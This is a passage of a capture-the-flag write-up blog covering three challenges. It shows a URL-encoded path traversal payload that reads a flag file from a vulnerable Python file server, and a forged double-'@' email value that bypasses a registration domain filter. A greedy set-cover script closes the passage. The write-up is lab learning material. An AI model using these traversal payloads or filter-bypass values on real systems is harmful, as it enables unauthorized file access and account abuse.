    '''&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;match_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'index.html'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;client requested: {path}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Application&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setup_error_middlewares&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r'/{path:.*}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;stream_file&lt;/code&gt; function is not protected against &lt;strong&gt;directory path traversal&lt;/strong&gt; so it allows us to exploit a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability in order to read the file containing the flag.&lt;/p&gt;

&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; as a payload, it will be interpreted by our browser which will request the root of the webserver. That’s not what we want so we need to &lt;strong&gt;URL-encode&lt;/strong&gt; our payload, such as: &lt;code class=&quot;highlighter-rouge&quot;&gt;..%2f&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As suggested by the challenge statement, the flag file is stored in the &lt;code class=&quot;highlighter-rouge&quot;&gt;universe/&lt;/code&gt; folder. We can verify the LFI thanks to the following payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;..%2funiverse&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/universe.png&quot; alt=&quot;LFI PoC&quot; title=&quot;LFI PoC&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;DT_DIR&lt;/code&gt; inside the response headers indicates that we are accessing an existing directory. Now, let’s retrieve the flag thanks to the following payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;..%2funiverse%2fflag&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The flag is inside the downloaded file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;_universe_flag
INSA&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;3e508f6e93fb2b6de561d5277f2a9b26bc79c5f349c467a91dd12769232c1a29&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;web-almost-tchap&quot;&gt;[Web] Almost Tchap&lt;/h2&gt;

&lt;h3 id=&quot;statement-1&quot;&gt;Statement&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;This is a message to all ATchap employees. Our new communication software is now in a beta mode. To register, just enter you email address, you’ll receive shortly the activation code.&lt;/p&gt;

  &lt;p&gt;https://atchap.ctf.insecurity-insa.fr&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This challenge was in the era of time since it exploited &lt;a href=&quot;https://medium.com/@fs0c131y/tchap-the-super-not-secure-app-of-the-french-government-84b31517d144&quot;&gt;a vulnerabilty&lt;/a&gt; found by &lt;a href=&quot;https://twitter.com/fs0c131y&quot;&gt;@fs0c131y&lt;/a&gt; a few weeks ago inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;Tchap&lt;/code&gt; application.&lt;/p&gt;

&lt;h3 id=&quot;resolution-1&quot;&gt;Resolution&lt;/h3&gt;

&lt;p&gt;The website offers to register using an email address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/almosttchap.png&quot; alt=&quot;Almost Tchap&quot; title=&quot;Almost Tchap&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, email addresses are filtered and only an address ending with &lt;code class=&quot;highlighter-rouge&quot;&gt;@almosttchap.fr&lt;/code&gt; would be accepted.&lt;/p&gt;

&lt;p&gt;Thanks to the footer of the website, it was easy to guess a valid email address, as you can see on the following picture:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/real_mail.png&quot; alt=&quot;Real emails&quot; title=&quot;Real email&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Registering with the address &lt;code class=&quot;highlighter-rouge&quot;&gt;maud.erateur@almosttchap.fr&lt;/code&gt; was authorized and we could then intercept the request with &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt; in order to modify the submitted email address.&lt;/p&gt;

&lt;p&gt;Actually, forging an email address in the following format will pass the filter and send the confirmation code to our personal address: &lt;code class=&quot;highlighter-rouge&quot;&gt;personal@mail.fr@maud.erateur@almosttchap.fr&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For this challenge, I used a temporary email address provided by &lt;a href=&quot;https://temp-mail.org/&quot;&gt;https://temp-mail.org/&lt;/a&gt;. Below, the screen capture of the request interception inside &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/burp.png&quot; alt=&quot;Burp&quot; title=&quot;Burp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After forwarding the modified request, the code has been sent to us.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/at-flag.png&quot; alt=&quot;Flag&quot; title=&quot;Flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INSA{1fd9fa56444a424d}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;programming-hackcode-0102&quot;&gt;[Programming] HackCode-01/02&lt;/h2&gt;

&lt;h3 id=&quot;statement-2&quot;&gt;Statement&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;This challenge gives 4 flags of increasing difficulty.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/2019-05-08/routes.txt&quot; title=&quot;Routes.txt&quot;&gt;This file&lt;/a&gt; contains 10 000 network routes. We want to have at least one network tap on each route. Find a list of routers to intercept, and keep the number of taps low ! You will get the first flag for any solution with at most 150 taps.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;example&quot;&gt;Example&lt;/h4&gt;

&lt;p&gt;If we have the following routes :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c,b,a
d,a,g
b,c,e
f,d,g
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;One solution could be :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;g
b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The aim of this challenge was to find a minimum set of routers that covers all network routes inside routes.txt.&lt;/p&gt;

&lt;p&gt;My strategy was very naive and only allowed me to reach the second flag of this challenge, but still, it was fun to do so I’ll share it here. If you want complete writeup of the 4 steps, I recommand you to read &lt;a href=&quot;https://www.aperikube.fr/docs/inshack_2019/proggenius/&quot;&gt;this one&lt;/a&gt; from Aperikube.&lt;/p&gt;

&lt;h3 id=&quot;strategy&quot;&gt;Strategy&lt;/h3&gt;

&lt;p&gt;This piece of pseudo-code will help you understanding my approach:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;occurences_set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_occurences_of_each_router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;init_routes_coverage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Tells which routes are already covered by a router
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;covered&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;already&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_the_best_router_of_the_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// The best in term of number of occurences
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;part-01&quot;&gt;Part 01&lt;/h3&gt;

&lt;p&gt;I wrote &lt;a href=&quot;http://localhost:4000/assets/2019-05-08/script01.py&quot; title=&quot;HackCode 01 script&quot;&gt;the following script&lt;/a&gt;, implementing the approach explained before, giving a solution of &lt;strong&gt;141 routers&lt;/strong&gt;. This was enough for the first flag!&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coverage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;coverage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;solution_covers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_unique_routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'routes.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#print(routers)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; unique routers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;count_router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'routes.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sorted_occurences&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sorted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sorted_occurences&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_best_router_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'router'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
